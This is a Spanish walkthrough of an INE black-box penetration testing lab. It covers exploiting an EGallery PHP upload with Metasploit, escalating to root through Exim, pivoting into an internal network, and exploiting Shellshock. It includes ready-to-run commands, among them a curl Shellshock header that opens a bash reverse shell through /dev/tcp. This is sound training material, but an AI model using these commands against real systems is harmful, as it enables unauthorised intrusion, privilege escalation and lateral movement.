
# Explotación en Linux

## <mark style="color:purple;">Lab: Black Box Penetration Testing</mark>

En este laboratorio aprenderás a encontrar y explotar una aplicación web vulnerable. También se abordarán técnicas de post-explotación para extraer información confidencial y realizar maniobras de pivote.

En este entorno de laboratorio accederás a una instancia de Kali GUI. Se puede acceder a una aplicación vulnerable en [http://demo.ine.local](http://demo.ine.local/)

**Objetivo:** ¡Explotar el objetivo y encontrar todas las flags!

***

### Escaneo de puertos

```bash
root@INE:~# nmap -sV demo.ine.local

PORT   STATE SERVICE VERSION
25/tcp open  smtp    Exim smtpd 4.89
80/tcp open  http    Apache httpd 2.4.7 ((Ubuntu))
MAC Address: 02:42:C0:70:E6:03 (Unknown)
```

Tenemos abierto los puerto 25 (SMTP) y el 80 (HTTP). Empezaremos por el servicio web.

***

## <mark style="color:purple;">Explotación web</mark>

Al acceder a la web vemos que la única funcionalidad que tiene es descargarnos una galería completa en formato ZIP:

<figure><img src="/files/w5ygAZEXmyW1tWPP0ZKC" alt=""><figcaption></figcaption></figure>

Vemos que usa la siguiente galería de fotos, que puede ser vulnerable:

```
EGallery - PHP Image Gallery
```

{% embed url="<http://ericheikkinen.com/egallery-automatic-php-image-galleries/>" %}

#### Fuzzing

Haciendo fuzzing descubrimos un README y una página de login:

```bash
root@INE:~# dirsearch -u demo.ine.local -x 403,404

  _|. _ _  _  _  _ _|_    v0.4.2                                                                                                           
 (_||| _) (/_(_|| (_| )                                                                                                                    
                                                                                                                                           
Extensions: php, aspx, jsp, html, js | HTTP method: GET | Threads: 30 | Wordlist size: 10927
Output File: /root/.dirsearch/reports/demo.ine.local_26-03-24_18-32-23.txt
Error Log: /root/.dirsearch/logs/errors-26-03-24_18-32-23.log
Target: http://demo.ine.local/

[18:32:23] Starting: 
[18:32:27] 200 -    2KB - /README.txt                                       
[18:32:39] 200 -    1KB - /index.php                                        
[18:32:39] 200 -    1KB - /index.php/login/ 
```

El README nos indica como usar la galería EGallery, y observamos que es muy antiguo, del 2012, por lo que es muy probable que tenga vulnerabilidades conocidas:

<figure><img src="/files/B7dLnP9vwX0B42PyFO4u" alt=""><figcaption></figcaption></figure>

Comprobamos que al pulsar en descargar galería, nos la descarga desde la siguiente URL:

```
http://demo.ine.local//egallery/download.php?zip=1
```

La página de login es un falso positivo, nos lleva a la misma página inicial.

### Explotación de Egallery

Buscando exploits encontramos multitud con Searchsploit:

```bash
root@INE:~# searchsploit egallery
------------------------------------------------------------------------------------------------------------------------------------- ---------------------------------
 Exploit Title                                                                                                                       |  Path
------------------------------------------------------------------------------------------------------------------------------------- ---------------------------------
DBImageGallery 1.2.2 - 'donsimg_base_path' Remote File Inclusion                                                                     | php/webapps/3353.txt
EGallery - Arbitrary '.PHP' File Upload (Metasploit)                                                                                 | php/webapps/20029.rb
Joomla! Component com_facegallery 1.0 - Multiple Vulnerabilities                                                                     | php/webapps/34754.py
Keyvan1 ImageGallery - Database Disclosure                                                                                           | asp/webapps/25661.txt
MAXdev My eGallery Module 3.04 - For Xoops 'gid' SQL Injection                                                                       | php/webapps/31392.txt
MDPro Module My_eGallery - 'pid' SQL Injection                                                                                       | php/webapps/8100.pl
myPHPNuke Module My_eGallery 2.5.6 - 'basepath' Remote File Inclusion                                                                | php/webapps/3010.txt
My_eGallery Module 3.1.1 - Remote File Inclusion Command Injection                                                                   | php/webapps/23403.pl
PHP-Nuke eGallery 3.0 Module - 'pid' SQL Injection                                                                                   | php/webapps/31331.txt
PHP-Nuke Module My_eGallery 2.7.9 - SQL Injection                                                                                    | php/webapps/5203.txt
SimpleGallery 0.1.3 - 'index.php' Cross-Site Scripting                                                                               | php/webapps/30811.txt
XOOPS Module My_eGallery 3.04 - 'gid' SQL Injection                                                                                  | php/webapps/5242.txt
```

Y encontramos el siguiente incluído en Metasploit que nos permite la subida de archivos PHP:

{% embed url="<https://www.exploit-db.com/exploits/20029>" %}

```bash
msfconsole
use exploit/unix/webapp/egallery_upload_exec
set rhosts demo.ine.local
set LHOST 192.112.230.2
set TARGETURI /
exploit

[*] Started reverse TCP handler on 192.112.230.2:4444 
[*] Sending PHP payload (SvOpSKk.php)
[*] Executing PHP payload (SvOpSKk.php)
[*] Sending stage (39282 bytes) to 192.112.230.3
[*] Meterpreter session 1 opened (192.112.230.2:4444 -> 192.112.230.3:33874 ) at 2026-03-24 18:58:48 +0530
```

```bash
msf6 exploit(unix/webapp/egallery_upload_exec) > sessions 1
[*] Starting interaction with 1...

meterpreter > getuid
Server username: www-data
```

### User flag

```bash
meterpreter > ls
Listing: /var/www/html
======================

Mode              Size  Type  Last modified              Name
----              ----  ----  -------------              ----
100777/rwxrwxrwx  2155  fil   2012-03-09 03:07:14 +0530  README.txt
100644/rw-r--r--  1123  fil   2026-03-24 18:58:48 +0530  SvOpSKk.php
040777/rwxrwxrwx  4096  dir   2022-01-24 13:35:56 +0530  THIS_IS_FLAG5234234324
040777/rwxrwxrwx  4096  dir   2012-03-09 00:42:52 +0530  egallery
100777/rwxrwxrwx  4848  fil   2012-03-09 00:13:42 +0530  index.php

meterpreter > cd THIS_IS_FLAG5234234324

meterpreter > ls
Listing: /var/www/html/THIS_IS_FLAG5234234324
=============================================

Mode              Size  Type  Last modified              Name
----              ----  ----  -------------              ----
100777/rwxrwxrwx  33    fil   2022-01-24 13:35:56 +0530  FLAG1

meterpreter > cat FLAG1
e56938b6e91af44bc116b494384b579e
```

### Escalada de privilegios

```bash
root@INE:~# nmap -sV -p 25 --script smtp-* demo.ine.local

PORT   STATE SERVICE VERSION
25/tcp open  smtp    Exim smtpd 4.89
```

Como vimos en la máquina también hay un servicio SMTP (Exim smtpd 4.89), y buscando en Metasploit encontramos un módulo de elevación de privilegios:

```bash
msf6 exploit(unix/webapp/egallery_upload_exec) > search exim

Matching Modules
================

   #  Name                                                Disclosure Date  Rank       Check  Description
   -  ----                                                ---------------  ----       -----  -----------
   0  exploit/unix/local/exim_perl_startup                2016-03-10       excellent  Yes    Exim "perl_startup" Privilege Escalation
   1  exploit/linux/local/exim4_deliver_message_priv_esc  2019-06-05       excellent  Yes    Exim 4.87 - 4.91 Local Privilege Escalation

Interact with a module by name or index. For example info 5, use 5 or use exploit/unix/webapp/wp_phpmailer_host_header

msf6 exploit(unix/webapp/egallery_upload_exec) > use 1
[*] No payload configured, defaulting to linux/x64/meterpreter/reverse_tcp
```

```bash
set SESSION 1
set LHOST eth1
set LPORT 5555
set payload /linux/x86/meterpreter/reverse_tcp
exploit

[!] SESSION may not be compatible with this module:
[!]  * incompatible session architecture: php
[!]  * missing Meterpreter features: stdapi_railgun_api
[*] Started reverse TCP handler on 192.112.230.2:5555 
[*] Running automatic check ("set AutoCheck false" to disable)
[+] The target appears to be vulnerable.
[*] Payload sent, wait a few seconds...
[*] Sending stage (984904 bytes) to 192.112.230.3
[+] Deleted /tmp/scFVMutRqs
[*] Meterpreter session 2 opened (192.112.230.2:5555 -> 192.112.230.3:32842 ) at 2026-03-24 19:18:07 +0530

meterpreter > getuid
Server username: root
```

### Root Flag

```bash
meterpreter > ls
Listing: /root
==============

Mode              Size  Type  Last modified              Name
----              ----  ----  -------------              ----
100644/rw-r--r--  3106  fil   2014-02-20 08:13:56 +0530  .bashrc
100644/rw-r--r--  140   fil   2014-02-20 08:13:56 +0530  .profile
100644/rw-r--r--  33    fil   2022-01-24 13:37:35 +0530  FLAG2

meterpreter > cat FLAG2
79ff114680e11e44a71d773068485a9e
```

***

## Explotación interna

### Pivoting

Una vez que hemos accedido, al ver las interfaces de red encontramos una red interna que no era accesible desde nuestro Kali:

```bash
meterpreter > ifconfig

Interface  1
============
Name         : lo
Hardware MAC : 00:00:00:00:00:00
MTU          : 65536
Flags        : UP,LOOPBACK
IPv4 Address : 127.0.0.1
IPv4 Netmask : 255.0.0.0
IPv6 Address : ::1
IPv6 Netmask : ffff:ffff:ffff:ffff:ffff:ffff::

Interface  2
============
Name         : ip_vti0
Hardware MAC : 00:00:00:00:00:00
MTU          : 1480
Flags        : NOARP

Interface 777480
============
Name         : eth0
Hardware MAC : 02:42:c0:70:e6:03
MTU          : 1500
Flags        : UP,BROADCAST,MULTICAST
IPv4 Address : 192.112.230.3
IPv4 Netmask : 255.255.255.0

Interface 777482
============
Name         : eth1
Hardware MAC : 02:42:c0:7c:56:02
MTU          : 1500
Flags        : UP,BROADCAST,MULTICAST
IPv4 Address : 192.124.86.2  ## Red interna accesible
IPv4 Netmask : 255.255.255.0
```

Concretamente la IP de nuestro Kali está en la red: `192.112.230.2` y la máquina tiene la IP `192.124.86.2` en la red interna.

### Autoroute a la red interna

```bash
meterpreter > run autoroute -s 192.124.86.0/24

[!] Meterpreter scripts are deprecated. Try post/multi/manage/autoroute.
[!] Example: run post/multi/manage/autoroute OPTION=value [...]
[*] Adding a route to 192.124.86.0/255.255.255.0...
[+] Added route to 192.124.86.0/255.255.255.0 via 192.112.230.3
[*] Use the -p option to list all active routes
```

### Ping Sweep

Vamos a detectar otras posibles máquinas internas en la red a las que podamos acceder:

```bash
use post/multi/gather/ping_sweep
set rhosts 192.124.86.0/24
set session 1
exploit

[*] Performing ping sweep for IP range 192.124.86.0/24
[+]     192.124.86.1 host found
[+]     192.124.86.2 host found ## Nuesta máquina
[+]     192.124.86.3 host found
```

Tenemos 3 hosts Internos! Ahora escanearemos los puertos desde Metasploit.

### Escaneo de puertos interno

```bash
use auxiliary/scanner/portscan/tcp 

msf6 auxiliary(scanner/portscan/tcp) > set rhosts 192.124.86.1-5
msf6 auxiliary(scanner/portscan/tcp) > run

[+] 192.124.86.1:         - 192.124.86.1:22 - TCP OPEN
```

Encontramos un acceso SSH en la máquina `192.124.86.1`.

```bash
msf6 auxiliary(scanner/portscan/tcp) > set rhosts 192.124.86.3-5
msf6 auxiliary(scanner/portscan/tcp) > run

[+] 192.124.86.3:         - 192.124.86.3:80 - TCP OPEN
```

Y encontramos un servicio web en la máquina `192.124.86.3`.

### Habilitar Port Forwarding

Lo habilitaremos desde Meterpreter para acceder al puerto 80 de la IP `192.124.86.3` desde el puerto 1234 de nuestro Kali Linux:

```bash
meterpreter > portfwd add -l 1234 -p 80 -r 192.124.86.3
[*] Local TCP relay created: :1234 <-> 192.124.86.3:80
```

En Kali confirmamos que está habilitado:

```bash
root@INE:~# netstat -antp

Active Internet connections (servers and established)
Proto Recv-Q Send-Q Local Address           Foreign Address         State       PID/Program name    
tcp        0      0 0.0.0.0:5910            0.0.0.0:*               LISTEN      260/Xtigervnc       
tcp        0      0 0.0.0.0:1234            0.0.0.0:*               LISTEN      15362/ruby
```

### Enumeración interna

#### Escaneo de puertos

```bash
root@INE:~# nmap -sV -p 1234 localhost

PORT     STATE SERVICE VERSION
1234/tcp open  http    Apache httpd 2.2.22 ((Debian))
```

Observamos que es un `Apache httpd 2.2.22`.

Al acceder parece que es una especie de contador / reloj sin ninguna funcionalidad:

<figure><img src="/files/FebngjRdOxgQijtAx1PL" alt=""><figcaption></figcaption></figure>

Si vemos el código fuente encontramos que el contenido se pinta desde `/cgi-bin/stats`

```html
<html>
<head>
<title>AttackDefense</title>
</head>
<body>
</br>
<iframe frameborder=0 width=800 height=600 src="/cgi-bin/stats"></iframe>
</body>
</html>
```

Esto confirma la vulnerabilidad Shellshock, que explotaremos.

### Explotación de Shellshock

#### Manual

Podemos ejecutar comandos de sistema operativo directamente desde Kali con el siguiente comando:

```bash
root@INE:~# curl -H 'User-Agent: () { :; }; echo; echo; /bin/bash -c "id"' http://127.0.0.1:1234/cgi-bin/stats

uid=33(www-data) gid=33(www-data) groups=33(www-data)
```

Y podemos conseguir una reverse shell fácilmente:

```bash
nc -nlvp 4444
```

```bash
curl -H 'User-Agent: () { :; }; echo; echo; /bin/bash -c "bash -i >& /dev/tcp/192.112.230.2/4444 0>&1"' http://127.0.0.1:1234/cgi-bin/stats
```

#### Automático

Con Metasploit:

```bash
use exploit/multi/http/apache_mod_cgi_bash_env_exec

set RHOSTS 127.0.0.1
set RPORT 1234
set TARGETURI /cgi-bin/stats

set payload cmd/unix/reverse_bash
set LHOST 192.112.230.2
set LPORT 4444

exploit
```
